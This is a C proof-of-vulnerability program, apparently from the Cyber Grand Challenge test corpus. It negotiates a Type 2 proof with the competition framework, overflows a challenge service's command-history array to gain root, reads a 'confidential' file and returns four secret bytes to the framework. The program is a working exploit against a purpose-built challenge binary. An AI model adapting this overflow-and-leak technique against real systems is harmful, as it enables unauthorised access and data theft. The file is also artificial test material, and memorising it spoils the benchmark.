/*

Author: Joe Rogers <joe@cromulence.com>

Copyright (c) 2015 Cromulence LLC

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in
all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
THE SOFTWARE.

*/
#include "libcgc.h"

unsigned int cgc_ReadBytes(int fd, char *buf, unsigned int len) {
	unsigned int total_bytes = 0;
	cgc_size_t rx_bytes;
	char c;

	while (total_bytes < len) {
		if (cgc_receive(fd, &c, 1, &rx_bytes) != 0) {
			return(0);
		}
		if (rx_bytes == 0) {
			return(0);
		}
		buf[total_bytes++] = c;
	}

	return(total_bytes);
}

unsigned int cgc_ReadUntil(int fd, char delim, char *buf, unsigned int maxlen) {
	unsigned int total_bytes = 0;
	cgc_size_t rx_bytes;
	char c;

	while (total_bytes < maxlen-1) {
		if (cgc_receive(fd, &c, 1, &rx_bytes) != 0) {
			return(0);
		}
		if (rx_bytes == 0) {
			return(0);
		}
		if (c == delim) {
			break;
		}
		buf[total_bytes++] = c;
	}
	buf[total_bytes] = '\0';

	return(total_bytes);
}

unsigned int cgc_SendBytes(int fd, char *buf, unsigned int len) {
	cgc_size_t tx_bytes;
	unsigned int total_bytes = 0;

	while (total_bytes < len) {
		if (cgc_transmit(fd, buf+total_bytes, 1, &tx_bytes) != 0) {
			return(0);
		}
		if (tx_bytes != 1) {
			return(0);
		}
		total_bytes++;
	}

	return(total_bytes);
}

unsigned int cgc_pov_strlen(char *buf) {
	unsigned int len = 0;
	while (*(buf+len) != '\0') {
		len++;
	}
	return(len);
}

unsigned int cgc_SendString(int fd, char *buf) {
	unsigned int len = 0;

	return(cgc_SendBytes(fd, buf, cgc_pov_strlen(buf)));
}

void cgc_NegotiateType2Pov(unsigned int *type2_addr, unsigned int *type2_size, unsigned int *type2_length) {
	unsigned int PovType = 2;

	// Request Type 2 negotitation
	if (cgc_SendBytes(3, (char *)&PovType, 4) != 4) {
		cgc__terminate(-1);
	}

	// get the 4-byte value for type2_addr
	if (cgc_ReadBytes(3, (char *)type2_addr, 4) != 4) {
		cgc__terminate(-1);
	} 
	// get the 4-byte value for type2_size
	if (cgc_ReadBytes(3, (char *)type2_size, 4) != 4) {
		cgc__terminate(-1);
	} 
	// get the 4-byte value for type2_length
	if (cgc_ReadBytes(3, (char *)type2_length, 4) != 4) {
		cgc__terminate(-1);
	} 

	return;

}

int main(int cgc_argc, char *cgc_argv[]) {
	unsigned int type2_addr;
	unsigned int type2_size;
	unsigned int type2_length;
	char buf[100];
	char secret_buf[100];
	unsigned int i;

	// negotiate a Type2 POV with the Competition Framework
	cgc_NegotiateType2Pov(&type2_addr, &type2_size, &type2_length);

	// cgc_read in the prompt
	cgc_ReadBytes(0, buf, 8);

	// Overflow the command history array
	for (i = 0; i < 17; i++) {
		cgc_SendString(1, "root\n\r");
		// cgc_read the end of the entered command
		cgc_ReadUntil(0, '\r', buf, 99);
		// cgc_read the "Invalid command: " message
		cgc_ReadUntil(0, '\r', buf, 99);
		// cgc_read the next prompt
		cgc_ReadBytes(0, buf, 8);
	}

	// Now that we're root, cat the 'confidential' file owned by 'secure'
	cgc_SendString(1, "dump confidential\n\r");
	cgc_ReadUntil(0, '\r', buf, 99);
	cgc_ReadBytes(0, secret_buf, 4);
	cgc_ReadBytes(0, buf, 9);

	// send cgc_exit to cleanly cgc_exit
	cgc_SendString(1, "exit\n\r");

	// send the bytes to the competition framework
	cgc_SendBytes(3, secret_buf, 4);

}
